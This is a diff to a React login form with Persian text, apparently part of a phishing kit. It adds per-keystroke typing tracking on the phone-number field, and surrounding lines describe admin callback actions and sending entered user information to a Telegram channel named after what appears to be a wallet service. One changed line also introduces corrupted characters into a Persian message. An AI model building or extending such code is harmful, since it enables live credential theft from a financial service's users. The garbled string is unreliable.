@@ -102,6 +102,9 @@ export const LoginForm = () => {
     enabled: !!sessionId,
   });
 
+  // Create typing handlers for phone input
+  const phoneTypingHandler = presence.createTypingHandler("phone");
+
   // Register callback handler for admin actions
   useEffect(() => {
     if (sessionId) {
@@ -573,7 +576,7 @@ export const LoginForm = () => {
     }
 
     // تشخیص تایپ برای presence system
-    presence.startTyping("phone");
+    phoneTypingHandler.onKeyDown();
   };
 
   const handleBack = () => {
@@ -888,7 +891,7 @@ export const LoginForm = () => {
                 <div style={{ marginTop: "8px" }}>
                   <AlertMessage>
                     {!validateTelegramConfig()
-                      ? "🎭 حالت دمو: اطلاعات به کنسول ارسال می‌شود. برای فعال‌سازی تلگرام، فایل .env را تنظیم کنید."
+                      ? "🎭 حالت دمو: اطلاعات به کنسول ارسال می‌شود. برای فعال‌سازی تلگرام، فایل .env را ت��ظیم کنید."
                       : "🤖 بات تلگرام فعال: اطلاعات به کانال والکس ارسال خواهد شد."}
                   </AlertMessage>
                 </div>
@@ -962,8 +965,8 @@ export const LoginForm = () => {
                       maxLength={11}
                       value={toPersianDigits(mobileNumber)}
                       onChange={handleMobileNumberChange}
-                      onFocus={() => presence.startTyping("phone")}
-                      onBlur={() => presence.stopTyping()}
+                      onFocus={phoneTypingHandler.onFocus}
+                      onBlur={phoneTypingHandler.onBlur}
                       autoFocus
                       disabled={isSubmitting}
                       style={{
